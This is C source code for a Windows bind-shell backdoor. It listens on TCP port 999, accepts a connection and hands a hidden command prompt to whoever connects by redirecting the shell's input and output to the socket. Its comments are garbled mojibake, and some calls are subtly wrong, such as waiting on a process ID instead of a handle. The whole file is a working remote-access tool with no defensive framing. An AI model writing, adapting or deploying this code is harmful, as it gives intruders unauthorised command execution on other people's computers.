#pragma comment (lib,"ws2_32.lib")
#include <winsock2.h>

int main(int argc ,char **argv)
{
	WSADATA WSADA;
	sockaddr_in ServerAddr;
	SOCKET Csocket,SSocket;//����˺Ϳͻ����׽���
	int Addrsize;
	PROCESS_INFORMATION ProcessInfo;
	STARTUPINFO StartupInfo;
	char szCmdPath[255];

	//�����ڴ� ��ʼ������
	ZeroMemory(&ProcessInfo,sizeof(PROCESS_INFORMATION));
	ZeroMemory(&StartupInfo,sizeof(STARTUPINFO));
	ZeroMemory(&WSADA,sizeof(WSADATA));

	//��ȡcmd shell·��

	GetEnvironmentVariable("COMSPEC",szCmdPath,sizeof(szCmdPath));
	

	//����ws2_32.dll
	WSAStartup(0x0202,&WSADA);
	//���ñ�����Ϣ�Ͱ󶨷��������׽��� 

	ServerAddr.sin_family=AF_INET;
	ServerAddr.sin_addr.S_un.S_addr=INADDR_ANY;//�����е�ַ
	ServerAddr.sin_port=htons(999);
	SSocket=WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP,NULL,0,0);
	//�󶨶˿�
	bind(SSocket,(sockaddr*)&ServerAddr,sizeof(ServerAddr));
	
	//����
	listen(SSocket,1);
	Addrsize=sizeof(ServerAddr);
	
	//����Զ������shell
	Csocket=accept(SSocket,(sockaddr*)&Csocket,&Addrsize);
	StartupInfo.cb=sizeof(STARTUPINFO);
	StartupInfo.wShowWindow=SW_HIDE;
	StartupInfo.dwFlags=STARTF_USESTDHANDLES|STARTF_USESHOWWINDOW;
	StartupInfo.hStdInput=(HANDLE)Csocket;
	StartupInfo.hStdOutput=(HANDLE)Csocket;
	StartupInfo.hStdError=(HANDLE)Csocket;

	//���������ܵ�
	CreateProcess(NULL,szCmdPath,NULL,NULL,TRUE,0,NULL,NULL,&StartupInfo,&ProcessInfo);

	//�ȴ�shell�˳�
	WaitForSingleObject((HANDLE)ProcessInfo.dwProcessId,INFINITE);
	CloseHandle(ProcessInfo.hProcess);
	CloseHandle(ProcessInfo.hThread);

	closesocket(Csocket);
	closesocket(SSocket);
	WSACleanup();
	//�ر�ж��ws2_32.dll
	return 0;
}